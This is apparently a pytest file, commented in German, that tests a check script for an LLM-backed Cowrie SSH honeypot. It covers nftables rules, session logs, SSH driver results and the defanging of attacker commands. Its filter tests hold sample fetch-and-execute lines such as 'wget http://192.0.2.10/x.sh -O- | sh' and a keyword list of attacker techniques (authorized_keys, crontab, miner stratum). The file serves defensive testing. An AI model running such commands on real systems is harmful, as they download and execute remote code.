"""Prüft die Auswertung im Prüfskript für cowrie-b (Schritt 7.3).

Das Skript selbst läuft auf dem Sensor. Hier stehen seine Auswertungen mit
erfundenen Ereignissen und einem nftables-Regelsatz im JSON-Format von
``nft -j``. Die echte Ausgabe von nft prüft der CI-Job ``sensor`` mit
``scripts/test-nft-guard.sh``.
"""

from __future__ import annotations

import copy
import hashlib
import importlib.util
from datetime import datetime, timezone
from pathlib import Path

import pytest

SCRIPT = Path(__file__).resolve().parents[1] / "scripts" / "check-cowrie-b.py"
spec = importlib.util.spec_from_file_location("check_cowrie_b", SCRIPT)
check = importlib.util.module_from_spec(spec)
spec.loader.exec_module(check)

START = datetime(2026, 10, 2, 10, 0, tzinfo=timezone.utc)


def dport(port):
    return {"match": {"op": "==", "left": {"payload": {"protocol": "tcp", "field": "dport"}}, "right": port}}


def rule(chain, *expr):
    return {"rule": {"family": "ip", "table": "honeypot", "chain": chain, "handle": 9, "expr": list(expr)}}


RULESET = {
    "nftables": [
        {"metainfo": {"version": "1.1.3", "json_schema_version": 1}},
        {"table": {"family": "ip", "name": "honeypot", "handle": 1}},
        {"chain": {"family": "ip", "table": "honeypot", "name": "prerouting", "type": "nat", "hook": "prerouting", "prio": -110, "policy": "accept"}},
        {"chain": {"family": "ip", "table": "honeypot", "name": "input", "type": "filter", "hook": "input", "prio": 0, "policy": "accept"}},
        rule("prerouting", dport(22), {"redirect": {"port": 2222}}),
        rule("input", dport(2322), {"match": {"op": "==", "left": {"meta": {"key": "iif"}}, "right": "lo"}}, {"accept": None}),
        rule("input", dport(2322), {"match": {"op": "in", "left": {"ct": {"key": "status"}}, "right": "dnat"}}, {"accept": None}),
        rule("input", dport(2322), {"drop": None}),
        # Eine andere Tabelle zählt nicht.
        {"rule": {"family": "ip", "table": "docker", "chain": "x", "expr": [dport(22), {"redirect": {"port": 2322}}]}},
    ]
}


def test_the_expected_ruleset_passes():
    assert all(ok for _, ok in check.check_nft(RULESET))


def test_a_redirect_to_b_fails():
    ruleset = copy.deepcopy(RULESET)
    ruleset["nftables"][4] = rule("prerouting", dport(22), {"redirect": {"port": 2322}})
    assert [ok for _, ok in check.check_nft(ruleset)][:2] == [False, False]


def test_a_missing_or_reordered_guard_fails():
    without = copy.deepcopy(RULESET)
    del without["nftables"][7]
    assert not check.check_nft(without)[2][1]
    reordered = copy.deepcopy(RULESET)
    reordered["nftables"][5], reordered["nftables"][7] = reordered["nftables"][7], reordered["nftables"][5]
    assert not check.check_nft(reordered)[2][1]


def test_ct_status_as_a_list_is_understood():
    ruleset = copy.deepcopy(RULESET)
    ruleset["nftables"][6]["rule"]["expr"][1]["match"]["right"] = ["dnat"]
    assert all(ok for _, ok in check.check_nft(ruleset))


# --- Log ----------------------------------------------------------------------------


def stamp(seconds):
    return f"2026-10-02T10:00:{seconds:02d}.000000Z"


def digest(text):
    return hashlib.sha256(text.encode()).hexdigest()


def session(sid, commands, at=1, src="127.0.0.1", interactive=False, overrides=None):
    overrides = overrides or {}
    events = [
        {"eventid": "cowrie.session.connect", "session": sid, "src_ip": src, "timestamp": stamp(at)},
        {"eventid": "cowrie.login.success", "session": sid, "timestamp": stamp(at)},
    ]
    if interactive:
        events.append({"eventid": "cowrie.client.size", "session": sid, "timestamp": stamp(at)})
    for index, command in enumerate(commands, start=1):
        events.append({"eventid": "cowrie.command.input", "session": sid, "input": command, "timestamp": stamp(at)})
    for index, command in enumerate(commands, start=1):
        response = {
            "eventid": "cowrie.llm.response",
            "session": sid,
            "timestamp": stamp(at + 1),
            "command_index": index,
            "outcome": "ok",
            "client_gone": False,
            "input_sha256": digest(command),
        }
        response.update(overrides.get(index, {}))
        events.append(response)
    return events


def good_log():
    return (
        session("s1", ["uname -a"])
        + session("s2", ["uname -a", "id"])
        + session("s3", ["hostname"])
        + session("s4", ["uname -a", "", "id"], interactive=True)
    )


def evaluate(events, expect=None):
    checks, counts = check.check_log(check.sessions_since(events, START), check.PLAN, expect)
    return {text.split(":")[0]: ok for text, ok in checks}, counts


def test_the_plan_matches_the_expected_counts():
    assert check.expected_counts(check.PLAN) == (4, 1, 7)


def test_a_good_log_passes():
    checks, counts = evaluate(good_log())
    assert all(checks.values()), checks
    assert counts["outcomes"] == {"ok": 7}


def test_a_missing_response_fails():
    events = [e for e in good_log() if not (e["session"] == "s2" and e.get("command_index") == 2)]
    checks, _ = evaluate(events)
    assert not checks["llm.response"]
    assert not checks["command_index je Sitzung lückenlos 1..n"]


def test_a_wrong_hash_fails():
    events = good_log()[:-3] + session("s4", ["uname -a", "", "id"], interactive=True, overrides={2: {"input_sha256": digest("x")}})[-3:]
    checks, _ = evaluate(events)
    assert not checks["input_sha256 passt zum command.input am selben Index"]


def test_swapped_indices_fail_through_the_hash():
    events = session("s1", ["uname -a"]) + session("s2", ["uname -a", "id"], overrides={1: {"command_index": 2}, 2: {"command_index": 1}})
    events += session("s3", ["hostname"]) + session("s4", ["uname -a", "", "id"], interactive=True)
    checks, _ = evaluate(events)
    assert not checks["input_sha256 passt zum command.input am selben Index"]


def test_a_response_before_its_command_fails():
    events = good_log()
    first_input = next(i for i, e in enumerate(events) if e["eventid"] == "cowrie.command.input")
    response = next(i for i, e in enumerate(events) if e["eventid"] == "cowrie.llm.response")
    events.insert(first_input, events.pop(response))
    checks, _ = evaluate(events)
    assert not checks["jedes llm.response steht nach seinem command.input"]


def test_other_outcomes_fail_unless_expected():
    events = session("s1", ["uname -a"], overrides={1: {"outcome": "unavailable"}}) + good_log()[4:]
    checks, counts = evaluate(events)
    assert not checks["Outcomes"]
    checks, _ = evaluate(events, expect="unavailable")
    assert checks["Outcomes"]
    checks, _ = evaluate(good_log(), expect="rate_limited")
    assert not checks["Outcomes"]


def test_a_client_that_left_fails():
    events = session("s1", ["uname -a"], overrides={1: {"client_gone": True}}) + good_log()[4:]
    checks, _ = evaluate(events)
    assert not checks["client_gone"]


def test_older_and_foreign_sessions_are_not_ours():
    events = session("alt", ["id"], at=0) + session("fremd", ["id"], src="203.0.113.9") + good_log()
    old = [dict(e, timestamp="2026-10-02T09:59:59.000000Z") if e["session"] == "alt" else e for e in events]
    checks, counts = evaluate(old)
    assert all(checks.values()), checks
    assert counts["sitzungen"] == 4
    assert check.foreign_sessions(old, START) == 1


def test_docker_timestamps_with_nanoseconds_are_read():
    assert check.parse_time("2026-10-02T09:04:34.123456789Z") == datetime(2026, 10, 2, 9, 4, 34, 123456, tzinfo=timezone.utc)
    assert check.parse_time("2026-10-02T09:04:34Z") == datetime(2026, 10, 2, 9, 4, 34, tzinfo=timezone.utc)


# --- sshdrive --------------------------------------------------------------------------


def drive_results(motd_sha):
    return [
        {"name": "exec", "verbunden": True, "fertig": True, "kanaele": [{"exit": 0, "bytes": 70}]},
        {"name": "parallel", "verbunden": True, "fertig": True, "kanaele": [{"exit": 0, "bytes": 70}, {"exit": 0, "bytes": 39}]},
        {"name": "exec-eof", "verbunden": True, "fertig": True, "kanaele": [{"exit": 0, "bytes": 9}]},
        {"name": "interaktiv", "verbunden": True, "fertig": True, "motd_sha256": motd_sha, "kanaele": [{"exit": None, "bytes": 300}]},
    ]


def test_the_motd_is_compared_like_sshdrive_does():
    raw = check.MOTD.read_bytes()
    assert check.motd_digest(raw.replace(b"\n", b"\r\n")) == check.motd_digest(raw)
    assert check.motd_digest(b"\x1b[4h" + raw) == check.motd_digest(raw)


def test_drive_results_pass_with_motd_and_output():
    motd = check.motd_digest(check.MOTD.read_bytes())
    assert all(ok for _, ok in check.check_drive(drive_results(motd), check.PLAN, None))


@pytest.mark.parametrize("broken", ["motd", "silent", "missing"])
def test_drive_results_fail(broken):
    results = drive_results(check.motd_digest(check.MOTD.read_bytes()))
    if broken == "motd":
        results[3]["motd_sha256"] = digest("Welcome to bld-ci-03\n")
    elif broken == "silent":
        results[2]["kanaele"][0]["bytes"] = 0
    else:
        results.pop()
    assert not all(ok for _, ok in check.check_drive(results, check.PLAN, None))


def test_a_connection_without_login_is_not_a_test_session():
    probe = [{"eventid": "cowrie.session.connect", "session": "probe", "src_ip": "127.0.0.1", "timestamp": stamp(1)}]
    checks, counts = evaluate(probe + good_log())
    assert counts["sitzungen"] == 4
    assert all(checks.values()), checks


# --- --filtertest (E-045) ----------------------------------------------------------

import ipaddress  # noqa: E402
import re  # noqa: E402

DOCUMENTATION_NETS = [ipaddress.ip_network(n) for n in ("192.0.2.0/24", "198.51.100.0/24", "203.0.113.0/24")]
SERVER_DEFANG = Path(__file__).resolve().parents[2] / "server" / "app" / "defang.py"
SSHDRIVE = Path(__file__).resolve().parents[1] / "cowrie-b" / "lab" / "sshdrive.py"


def test_the_filter_plan_uses_only_documentation_targets():
    """Keine echten Angreiferwerte: nur RFC 5737 und example.com."""
    assert len(check.FILTER_PLAN) == 9
    names = [name for name, _ in check.FILTER_PLAN]
    commands = [command for _, command in check.FILTER_PLAN]
    assert len(set(names)) == len(names) and len(set(commands)) == len(commands)
    for command in commands:
        for address in re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", command):
            assert any(ipaddress.ip_address(address) in net for net in DOCUMENTATION_NETS), address
        for host in re.findall(r"(?:https?|stratum\+tcp)://([^/:\s\"]+)", command):
            assert host == "example.com" or host.endswith(".example.com") or ipaddress.ip_address(host), host
    joined = " ".join(commands)
    for kind in ("authorized_keys", "wget ", "curl ", "chmod +x", "crontab", "stratum"):
        assert kind in joined


def test_the_filter_plan_stays_under_cowries_limit():
    assert len(check.filter_steps(check.FILTER_PLAN)) < 20
    assert all(len(step["exec"]) == 1 for step in check.filter_steps(check.FILTER_PLAN))


def filter_log(overrides=None):
    overrides = overrides or {}
    events = []
    for n, (name, command) in enumerate(check.FILTER_PLAN):
        events += session(f"f{n}", [command], overrides={1: overrides.get(name, {})})
    return events


def filter_results(texts=None):
    texts = texts or {}
    return [
        {"name": name, "verbunden": True, "fertig": True, "kanaele": [{"exit": 0, "bytes": 5, "text": texts.get(name, "")}]}
        for name, _ in check.FILTER_PLAN
    ]


def test_filter_rows_pair_each_command_with_its_call_and_text():
    blocked = {"outcome": "upstream_error", "http_status": 502, "latency_ms": 800, "output_chars": 0}
    ok = {"http_status": 200, "latency_ms": 1200, "output_chars": 70}
    overrides = {name: dict(ok) for name, _ in check.FILTER_PLAN}
    overrides["miner"] = blocked
    rows = check.filter_rows(
        check.sessions_since(filter_log(overrides), START),
        check.FILTER_PLAN,
        filter_results({"uname": "Linux bld-ci-03 6.12.107", "miner": ""}),
    )
    assert [r["name"] for r in rows] == [name for name, _ in check.FILTER_PLAN]
    assert rows[0]["text"] == "Linux bld-ci-03 6.12.107" and rows[0]["outcome"] == "ok"
    assert (rows[-1]["outcome"], rows[-1]["http_status"]) == ("upstream_error", 502)
    lines, checks = check.filter_report(rows)
    assert all(ok for _, ok in checks)
    text = "\n".join(lines)
    assert "Outcomes: ok 8, upstream_error 1" in text
    assert "HTTP: 200 8, 502 1" in text
    assert "latency_ms (ok): Median 1200, Max 1200" in text
    assert "upstream_blocked" in text
    # Die Befehle selbst stehen nicht in der Ausgabe (außer whoami, das sein Kurzname ist).
    for name, command in check.FILTER_PLAN:
        assert command == name or command not in text


def test_a_missing_call_fails_the_filtertest():
    events = [e for e in filter_log() if not (e["session"] == "f3" and e["eventid"] == "cowrie.llm.response")]
    rows = check.filter_rows(check.sessions_since(events, START), check.FILTER_PLAN, filter_results())
    _, checks = check.filter_report(rows)
    assert not checks[0][1]
    assert rows[3]["aufrufe"] == 0


def test_the_preview_is_one_clean_defanged_line():
    raw = "--2026-10-14--  http://192.0.2.10/bins/x86_64\r\nConnecting to 192.0.2.10:80...\x1b[31m‮\ttext"
    shown = check.preview(raw)
    assert shown == "--2026-10-14--  hxxp://192[.]0[.]2[.]10/bins/x86_64 ⏎ Connecting to 192[.]0[.]2[.]10:80...[31m text"
    assert "\x1b" not in shown and "‮" not in shown


def test_the_preview_is_cut_at_200_characters():
    assert check.preview("a" * 200) == "a" * 200
    assert check.preview("a" * 201) == "a" * 200 + " …"
    assert check.preview("I'm sorry, but I can't help with that.") == "I'm sorry, but I can't help with that."


@pytest.mark.parametrize(
    "text",
    [
        "wget http://192.0.2.10/x.sh -O- | sh",
        "curl -fsSL HTTPS://example.com/install.sh",
        "ftp://198.51.100.20/a 203.0.113.9 and 10.0.0.1",
        "nichts zu tun",
    ],
)
def test_defang_matches_the_server(text):
    spec = importlib.util.spec_from_file_location("server_defang", SERVER_DEFANG)
    server = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(server)
    assert check.defang(text) == server.defang(text)


def test_the_text_wrapper_finds_what_it_needs_in_sshdrive():
    """sshdrive_text.py ersetzt channel_result; run_exec muss es über den Namen rufen."""
    source = SSHDRIVE.read_text(encoding="utf-8")
    assert "def channel_result(chan: Channel, data: bytes)" in source
    assert "def normalized(data: bytes)" in source
    assert "def main()" in source
    assert "channel_result(chan, bytes(chan.output))" in source
    wrapper = check.TEXT_DRIVER.read_text(encoding="utf-8")
    assert "sshdrive.channel_result = channel_result" in wrapper
    assert '"/cowrie/lab"' in wrapper
